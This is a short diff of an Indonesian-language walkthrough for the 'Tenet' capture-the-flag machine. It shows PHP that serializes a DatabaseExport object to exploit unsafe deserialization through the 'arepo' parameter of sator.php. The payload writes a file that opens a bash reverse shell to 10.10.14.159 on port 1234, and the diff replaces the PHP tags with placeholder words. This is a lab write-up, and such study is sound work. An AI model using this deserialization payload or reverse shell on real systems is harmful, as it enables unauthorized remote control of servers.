@@ -8,16 +8,21 @@
 8. pakai curl aja
 9. buat file rce.php > nano rce.php
 10. isi dari rce.php
-<?php
+
+opentagPHP
 
 class DatabaseExport {
+
 public $user_file ='rce.php';
+
 public $data = '<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/10.10.14.159/1234 0>&1\'") ?>';
+
 }
 
 print urlencode(serialize(new DatabaseExport))
 
-?>
+closetagPHP
+
 
 11. save file > jalankan php rce.php. Ini akan dimasukkan ke paramater bernama arepo
 12. sator.tenet.htb/sator.php?arepo=xxxxx
